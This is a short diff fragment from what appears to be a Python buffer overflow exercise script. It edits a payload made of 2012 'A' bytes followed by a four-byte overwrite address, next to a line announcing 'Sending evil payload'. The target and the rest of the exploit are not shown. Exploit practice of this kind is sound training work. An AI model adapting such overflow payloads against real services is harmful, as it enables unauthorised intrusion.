@@ -678,7 +678,7 @@ import sys
     # Final    = "\xDF\x14\x50\x62"
     
 username = b"fz3r0"
-message = b"A" * 2012 + b"\xDF\x14\x50\x62"
+message = b"A" * 2012 + b"\xdf\x14\x50\x62"
 
 try:        
         print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
